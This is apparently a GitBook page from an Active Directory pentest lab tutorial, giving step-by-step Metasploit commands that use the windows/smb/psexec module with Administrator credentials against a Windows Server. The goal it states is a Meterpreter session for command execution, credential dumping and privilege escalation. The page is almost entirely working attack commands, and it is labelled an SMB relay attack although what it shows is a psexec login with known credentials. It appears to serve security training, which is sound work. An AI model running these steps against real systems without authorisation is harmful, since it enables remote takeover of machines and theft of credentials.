# Gaining Shell Access

### **SMB Relay Attack – Exploiting with Metasploit (psexec)**

#### **🔹 Step 1: Become Root and Start Metasploit**

1. Open the terminal on the attacker machine.
2. Enter the following command to switch to root:

```bash
sudo su
```

3. Start Metasploit by typing:

```bash
msfconsole
```

***

#### **🔹 Step 2: Find and Use psexec Module**

1. Search for the `psexec` module using:

```bash
search psexec
```

2. Select the `windows/smb/psexec` module:

```bash
use exploit/windows/smb/psexec
```

***

#### **🔹 Step 3: Configure psexec Exploit**

✅ **Set target IP (Windows Server IP):**

```bash
set rhosts <WinSerIP>
```

✅ **Set SMB Domain:**

```bash
set smbdomain brotherdev.com
```

✅ **Set SMB User:**

```bash
set smbuser Administrator
```

✅ **Set SMB Password:**\
(Use actual password or a password list)

```bash
set smbpass P@$$w0rd
```

***

Note: You must use the Admin PC **username** and **password**.&#x20;

#### **🔹 Step 4: Set Target and Run the Exploit**

✅ To check available targets:

```bash
show targets
```

👉 If **Default (Automatic)** doesn’t work, try `1` or `2`.\
✅ To set target:

```bash
set target 1
```

✅ Run the exploit:

```bash
run
```

***

#### ✅ **Goal:**

👉 If successful, a **Meterpreter session** will be established, allowing full control over the target machine.\
👉 The attacker can now execute commands, dump credentials, and escalate privileges.

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://medium.com/@99alibinazam/gaining-shell-access-active-directory-attacks-c9e90ef5de9f" %}
